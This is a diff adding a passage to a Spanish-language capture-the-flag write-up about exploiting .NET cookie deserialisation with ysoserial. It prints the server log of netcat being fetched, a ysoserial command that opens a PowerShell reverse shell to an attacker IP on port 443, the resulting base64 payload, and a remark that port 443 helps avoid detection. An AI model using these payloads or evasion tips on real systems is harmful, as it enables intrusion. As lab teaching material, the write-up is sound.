@@ -259,3 +259,20 @@ pc1@windows C:\CTF\ysoserial>
 
 Iniciamos sesión de nuevo en /Admin y con `EditThisCookie` o desde las `herramientas de desarrollador` nos cambiamos la cookie Profile a una con la data serializada.
 
+Guardamos la cookie y al recargar no llega la petición de descarga de netcat:
+
+```
+❯ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.13.37.12 - - "GET /netcat.exe HTTP/1.1" 200 -
+```
+
+Ahora creamos una data para invocar el netcat y enviarnos una `reverse shell`:
+
+(siempre lo explico, pero por si acaso: nos mandamos la `reverse shell` por el puerto `443`, ya que es un puerto por el que normalmente se tramita información, por lo tanto, muchas veces los `sistemas de seguridad` no suelen prestarle mucha atención a la información que se tramita por ese puerto y de esa forma podemos ser un poco `menos detectables)
+
+```
+pc1@windows C:\CTF\ysoserial> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\netcat.exe -e powershell 10.13.14.7 443"
+ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxuZXRjYXQuZXhlIC1lIHBvd2Vyc2hlbGwgMTAuMTMuMTQuMTAgNDQzJw0KICAgICAgICB9DQogICAgfQ0KfQ==
+pc1@Windows C:\CTF\ysoserial>
+```
